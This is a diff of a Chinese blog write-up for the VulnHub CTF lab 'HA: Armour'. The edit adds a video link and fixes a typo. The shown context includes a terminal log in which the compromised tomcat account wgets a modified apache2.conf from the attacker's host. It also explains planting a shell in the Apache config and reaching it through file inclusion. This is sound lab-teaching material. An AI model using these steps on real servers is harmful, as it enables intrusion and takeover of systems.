@@ -14,18 +14,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="下载地址：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:21 CS">
+    <meta name="description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HA: Armour-Write-up">
 <meta property="og:url" content="https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/index.html">
 <meta property="og:site_name" content="Kali-Team">
-<meta property="og:description" content="下载地址：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:21 CS">
+<meta property="og:description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-10T05:54:15.258Z">
+<meta property="og:updated_time" content="2019-10-10T10:22:03.824Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HA: Armour-Write-up">
-<meta name="twitter:description" content="下载地址：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:21 CS">
+<meta name="twitter:description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
     
     
         
@@ -163,6 +163,7 @@
     <hr>
 <hr>
 <p>下载地址：<a href="https://www.vulnhub.com/entry/ha-armour,370/" target="_blank" rel="noopener">点我</a></p>
+<p>bilibili：<a href="https://www.bilibili.com/video/av70769082" target="_blank" rel="noopener">点我</a></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
 <li>nmap扫存活找到IP为：192.168.116.140</li>
 </ul>
@@ -275,7 +276,7 @@
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tomcat@ubuntu:/etc/apache2$ wget http://192.168.116.1:8000/apache2.conf -O apache2.conf</span><br><span class="line">&lt;p://192.168.116.1:8000/apache2.conf -O apache2.conf</span><br><span class="line">--2019-10-10 04:52:49--  http://192.168.116.1:8000/apache2.conf</span><br><span class="line">Connecting to 192.168.116.1:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7195 (7.0K) [text/plain]</span><br><span class="line">Saving to: ‘apache2.conf’</span><br><span class="line"></span><br><span class="line">apache2.conf        100%[===================&gt;]   7.03K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">utime(apache2.conf): Operation not permitted</span><br><span class="line">2019-10-10 04:52:49 (243 MB/s) - ‘apache2.conf’ saved [7195/7195]</span><br><span class="line"></span><br><span class="line">tomcat@ubuntu:/etc/apache2$ cat apache2.conf</span><br></pre></td></tr></table></figure>
 <ul>
-<li>写入后到80端口服务下的目录写木马。(这是官方出题人写的)，我试了不对，创建文件的用户为Tomcat，aarti用户读不了这个文件，所以是访问不了的，服务端包500错误。</li>
+<li>写入后到80端口服务下的目录写木马。(这是官方出题人写的)，我试了不对，创建文件的用户为Tomcat，aarti用户读不了这个文件，所以是访问不了的，服务端报500错误。</li>
 <li>后来我利用文件包含Apache的配置文件获取到了会话。</li>
 <li>就是把Shell写进Apache2.conf，再利用上面发现的文件包含漏洞。</li>
 </ul>
